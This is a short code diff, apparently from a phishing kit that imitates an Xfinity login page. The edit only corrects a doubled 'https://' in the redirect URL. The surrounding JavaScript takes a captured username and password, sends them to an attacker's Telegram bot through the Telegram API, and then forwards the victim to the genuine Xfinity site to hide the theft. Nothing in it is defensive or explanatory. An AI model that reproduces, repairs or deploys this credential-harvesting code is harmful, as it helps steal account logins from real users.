@@ -221,7 +221,7 @@ footer#footer ul li{
           fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=XFINITY-RESULT=Username::${result1}==++==Password::${result2}`, {
               method: "GET"
           }).then(success => {
-              window.location.replace("https://https://www.xfinity.com/national/");
+              window.location.replace("https://www.xfinity.com/national/");
           }, error => {
               alert("Message not sent")
               console.log(error)
